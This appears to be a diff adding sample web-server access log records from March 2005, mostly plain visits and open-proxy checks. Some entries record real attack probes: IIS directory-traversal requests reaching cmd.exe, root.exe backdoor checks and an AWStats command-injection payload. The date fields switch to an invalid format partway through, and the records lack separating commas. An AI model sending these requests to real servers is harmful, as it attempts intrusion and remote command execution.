@@ -1,0 +1,292 @@
+[{"host": "210.116.59.164", "date": ISODate("2005-03-13T04:05:47Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "210.116.59.164", "date": ISODate("2005-03-13T04:06:32Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "210.116.59.164", "date": ISODate("2005-03-13T04:07:19Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "210.116.59.164", "date": ISODate("2005-03-13T04:08:11Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "210.116.59.164", "date": ISODate("2005-03-13T04:09:00Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "211.141.115.145", "date": ISODate("2005-03-13T04:10:18Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "66.30.71.74", "date": ISODate("2005-03-13T08:03:27Z"), "path": "/scripts/nsiislog.dll", "request": "GET /scripts/nsiislog.dll HTTP/1.1"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:11Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:12Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:13Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:13Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:13Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:13Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:14Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:14Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:14Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "218.1.111.50", "date": ISODate("2005-03-13T10:36:14Z"), "path": "http://www.yahoo.com/", "request": "GET http://www.yahoo.com/ HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"}
+{"host": "66.131.126.31", "date": ISODate("2005-03-13T11:21:58Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "69.158.7.209", "date": ISODate("2005-03-13T11:41:59Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "213.129.21.137", "date": ISODate("2005-03-13T13:05:33Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:14Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:16Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:18Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:20Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:22Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:24Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:26Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:28Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:29Z"), "path": "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:31Z"), "path": "/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:32Z"), "path": "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:35Z"), "path": "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:36Z"), "path": "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:38Z"), "path": "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:40Z"), "path": "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.23.244.160", "date": ISODate("2005-03-13T13:48:42Z"), "path": "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "24.130.169.87", "date": ISODate("2005-03-13T15:02:44Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "221.237.66.208", "date": ISODate("2005-03-13T16:01:07Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "208.46.133.177", "date": ISODate("2005-03-13T17:35:46Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "218.88.202.208", "date": ISODate("2005-03-13T18:05:51Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "219.186.156.26", "date": ISODate("2005-03-13T18:27:25Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "65.202.33.226", "date": ISODate("2005-03-13T20:16:12Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "208.39.169.124", "date": ISODate("2005-03-13T21:24:58Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:45Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:45Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:45Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:46Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:47Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:48Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "220.110.29.27", "date": ISODate("2005-03-13T22:11:48Z"), "path": "/", "request": "GET / HTTP/1.1"}
+{"host": "61.205.6.71", "date": ISODate("2005-03-13T22:38:31Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "68.191.137.235", "date": ISODate("14/Mar/2005:00:07:32Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "157.91.44.1", "date": ISODate("14/Mar/2005:02:48:41Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "209.213.220.227", "date": ISODate("14/Mar/2005:04:11:06Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "218.201.121.99", "date": ISODate("14/Mar/2005:04:46:54Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "222.166.160.63", "date": ISODate("14/Mar/2005:06:53:25Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "66.21.127.198", "date": ISODate("14/Mar/2005:08:43:55Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "24.185.27.145", "date": ISODate("14/Mar/2005:10:40:23Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:40Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:40Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:40Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:41Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:41Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:41Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:42Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:42Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:42Z"), "path": "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:42Z"), "path": "/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:42Z"), "path": "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:43Z"), "path": "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:43Z"), "path": "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:43Z"), "path": "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:43Z"), "path": "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "69.246.7.31", "date": ISODate("14/Mar/2005:11:12:43Z"), "path": "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:36Z"), "path": "/scripts/root.exe?/c+dir", "request": "GET /scripts/root.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:37Z"), "path": "/MSADC/root.exe?/c+dir", "request": "GET /MSADC/root.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:37Z"), "path": "/c/winnt/system32/cmd.exe?/c+dir", "request": "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:37Z"), "path": "/d/winnt/system32/cmd.exe?/c+dir", "request": "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:38Z"), "path": "/scripts/..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:41Z"), "path": "/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:42Z"), "path": "/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir", "request": "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:42Z"), "path": "/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:43Z"), "path": "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:43Z"), "path": "/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:43Z"), "path": "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:44Z"), "path": "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:44Z"), "path": "/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:44Z"), "path": "/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:44Z"), "path": "/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "67.170.0.153", "date": ISODate("14/Mar/2005:14:10:45Z"), "path": "/scripts/..%252f../winnt/system32/cmd.exe?/c+dir", "request": "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" }
+{"host": "222.166.160.3", "date": ISODate("14/Mar/2005:15:13:37Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "61.10.7.140", "date": ISODate("14/Mar/2005:16:01:12Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "61.232.252.176", "date": ISODate("14/Mar/2005:17:04:27Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "219.133.25.250", "date": ISODate("14/Mar/2005:21:48:51Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "139.68.4.4", "date": ISODate("14/Mar/2005:21:50:42Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "204.102.106.103", "date": ISODate("14/Mar/2005:22:35:36Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "61.10.7.68", "date": ISODate("15/Mar/2005:01:24:48Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "67.136.86.162", "date": ISODate("15/Mar/2005:01:28:32Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "157.91.48.191", "date": ISODate("15/Mar/2005:01:46:23Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "67.154.159.190", "date": ISODate("15/Mar/2005:03:20:39Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:49Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:49Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:50Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:50Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:51Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:52Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
+{"host": "81.181.146.13", "date": ISODate("15/Mar/2005:05:06:53Z"), "path": "//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|", "request": "GET //cgi-bin/awstats/awstats.pl?configdir=|%20id%20| HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"}
